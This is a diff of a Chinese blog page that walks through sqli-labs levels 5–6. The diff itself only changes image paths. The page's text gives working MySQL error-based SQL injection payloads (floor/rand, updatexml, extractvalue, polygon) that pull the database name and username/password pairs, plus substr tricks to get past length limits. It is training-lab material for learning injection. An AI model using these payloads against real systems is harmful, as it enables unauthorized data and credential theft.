@@ -29,19 +29,19 @@
 <meta property="og:site_name" content="WJW&#39;s Blog">
 <meta property="og:description" content="源码中有 print_f(mysql_error())">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//2.png">
-<meta property="og:image" content="http://example.com/.com//3.png">
-<meta property="og:image" content="http://example.com/.com//4.png">
-<meta property="og:image" content="http://example.com/.com//7.png">
-<meta property="og:image" content="http://example.com/.com//5.png">
-<meta property="og:image" content="http://example.com/.com//6.png">
+<meta property="og:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/1.png">
+<meta property="og:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/2.png">
+<meta property="og:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/3.png">
+<meta property="og:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/4.png">
+<meta property="og:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/7.png">
+<meta property="og:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/5.png">
+<meta property="og:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/6.png">
 <meta property="article:published_time" content="2020-11-19T14:06:40.000Z">
 <meta property="article:modified_time" content="2021-07-27T01:57:02.179Z">
 <meta property="article:author" content="WJW">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://example.com/2020/11/19/sqli-labs/5~6/5~6.md/1.png">
 
 <link rel="canonical" href="http://example.com/2020/11/19/sqli-labs/5~6/">
 
@@ -272,15 +272,15 @@
 
 <h3 id="报错注入型"><a href="#报错注入型" class="headerlink" title="报错注入型"></a>报错注入型</h3><pre><code>输入?id=1到17页面显示正常 大于18 页面显示异常，得出没有页面没有显示位，无法使用联合注入
 </code></pre>
-<p><img src="/.com//1.png"><br>    尝试加单引号，出现sql语句报错，使用：报错注入。<br><img src="/.com//2.png"></p>
+<p><img src="5~6.md/1.png"><br>    尝试加单引号，出现sql语句报错，使用：报错注入。<br><img src="5~6.md/2.png"></p>
 <h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p><code>?id=1&#39; and (select 1 from (select count(*),concat(((查询语句)),floor(rand()*2))x from information_schema.tables group by x)a)--+</code><br>    可更改查询语句  获得其他数据,详细见双查询注入。</p>
-<h4 id="updatexml函数报错注入"><a href="#updatexml函数报错注入" class="headerlink" title="updatexml函数报错注入"></a>updatexml函数报错注入</h4><p>语法：<br><code>updatexml(文档类型,xpath路径,更新的内容)</code><br>xpath路径写入其他格式就会报错，并返回我们写入的非法格式内容。<br><code>?id=1&#39; and updatexml (1,concat(0x7c,(select database())),1)--+</code> **0x7c后面的逗号不能漏。这里id的值影响不大但是单引号不能漏，不然不会报错。<br><img src="/.com//3.png"></p>
+<h4 id="updatexml函数报错注入"><a href="#updatexml函数报错注入" class="headerlink" title="updatexml函数报错注入"></a>updatexml函数报错注入</h4><p>语法：<br><code>updatexml(文档类型,xpath路径,更新的内容)</code><br>xpath路径写入其他格式就会报错，并返回我们写入的非法格式内容。<br><code>?id=1&#39; and updatexml (1,concat(0x7c,(select database())),1)--+</code> **0x7c后面的逗号不能漏。这里id的值影响不大但是单引号不能漏，不然不会报错。<br><img src="5~6.md/3.png"></p>
 <p>补充：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">polygon函数替换updatexml</span><br><span class="line"></span><br><span class="line">select polygon((select*from(select*from*(select@@version)f)x))</span><br></pre></td></tr></table></figure>
 
-<h4 id="extractvalue函数报错注入"><a href="#extractvalue函数报错注入" class="headerlink" title="extractvalue函数报错注入"></a>extractvalue函数报错注入</h4><p>语法：<br><code>extractvalue(文档类型，xpath路径)</code><br><code>?id=1&#39; and extractvalue(1,concat(0x7c,(查询语句)))</code>,<br><img src="/.com//4.png">    </p>
-<h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p><code>?id=1&#39; and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)--+</code><br><img src="/.com//7.png"></p>
-<h3 id="第六关，”闭合型报错，使用报错语句注入即可。"><a href="#第六关，”闭合型报错，使用报错语句注入即可。" class="headerlink" title="第六关，”闭合型报错，使用报错语句注入即可。"></a>第六关，”闭合型报错，使用报错语句注入即可。</h3><p>*** 补充一下报错获取用户账户和秘密的代码。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select username from users limit 0,1)),1)--+</code><br><img src="/.com//5.png"><br>如果直接要直接查找username,password 记得使用concat进行连接。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select concat(username,password)from users limit 0,1)),1)--+</code><br>但是结果也只能慢慢报出，所以一个个查也是可以的，因为长度过长。<br><img src="/.com//6.png"></p>
+<h4 id="extractvalue函数报错注入"><a href="#extractvalue函数报错注入" class="headerlink" title="extractvalue函数报错注入"></a>extractvalue函数报错注入</h4><p>语法：<br><code>extractvalue(文档类型，xpath路径)</code><br><code>?id=1&#39; and extractvalue(1,concat(0x7c,(查询语句)))</code>,<br><img src="5~6.md/4.png">    </p>
+<h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p><code>?id=1&#39; and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)--+</code><br><img src="5~6.md/7.png"></p>
+<h3 id="第六关，”闭合型报错，使用报错语句注入即可。"><a href="#第六关，”闭合型报错，使用报错语句注入即可。" class="headerlink" title="第六关，”闭合型报错，使用报错语句注入即可。"></a>第六关，”闭合型报错，使用报错语句注入即可。</h3><p>*** 补充一下报错获取用户账户和秘密的代码。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select username from users limit 0,1)),1)--+</code><br><img src="5~6.md/5.png"><br>如果直接要直接查找username,password 记得使用concat进行连接。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select concat(username,password)from users limit 0,1)),1)--+</code><br>但是结果也只能慢慢报出，所以一个个查也是可以的，因为长度过长。<br><img src="5~6.md/6.png"></p>
 <p>对于报错注入长度限制：</p>
 <p>我们可以使用函数substr、mid、substring进行截断：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7c,(select substr(concat(password),1,10)from &#x27;users&#x27; limit 0,1),0x7c),1)#</span><br></pre></td></tr></table></figure>
